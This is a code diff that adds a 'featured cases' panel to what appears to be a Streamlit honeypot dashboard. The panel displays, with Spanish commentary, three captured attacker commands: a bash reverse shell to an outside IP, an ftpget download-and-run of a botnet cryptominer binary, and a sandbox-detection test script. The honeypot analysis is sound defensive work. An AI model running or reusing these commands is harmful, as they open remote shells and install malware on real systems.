@@ -43,6 +43,35 @@ else:
 
 st.markdown("---")
 
+# --- Casos destacados: los comandos mas interesantes capturados ---
+st.write("### ⭐ Casos Destacados")
+st.caption("Los eventos más reveladores capturados hasta ahora, seleccionados manualmente.")
+
+CASOS_DESTACADOS = [
+    {
+        "titulo": "🔓 Reverse Shell hacia servidor externo",
+        "comando": "bash -i >& /dev/tcp/45.33.32.156/4444 0>&1",
+        "descripcion": "Técnica clásica de post-explotación: el atacante intenta abrir una shell interactiva reversa hacia un servidor de control remoto, en el puerto 4444 (típico de Metasploit/netcat).",
+    },
+    {
+        "titulo": "⛏️ Descarga de criptominer vía FTP",
+        "comando": "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
+        "descripcion": "Patrón típico de botnet IoT (Mirai/Gafgyt): descarga un binario vía FTP (con fallback a BusyBox para dispositivos embebidos), lo ejecuta y se autoborra. El archivo real capturado (12 MB) fue identificado como criptominer.",
+    },
+    {
+        "titulo": "🕵️ Autodetección de honeypot",
+        "comando": '/usr/bin/bash -c printf "#!/bin/bash\\necho \\"xxxxxx\\"\\n" > filter && chmod +x filter && ./filter && rm -rf filter',
+        "descripcion": "El atacante crea, ejecuta y borra un script de prueba para verificar si tiene permisos reales de escritura/ejecución — una técnica de evasión de sandboxes y honeypots.",
+    },
+]
+
+for caso in CASOS_DESTACADOS:
+    with st.expander(caso["titulo"]):
+        st.code(caso["comando"], language="bash")
+        st.write(caso["descripcion"])
+
+st.markdown("---")
+
 # --- Incidentes: metricas + estadisticas + historial completo ---
 df = pd.DataFrame()
 
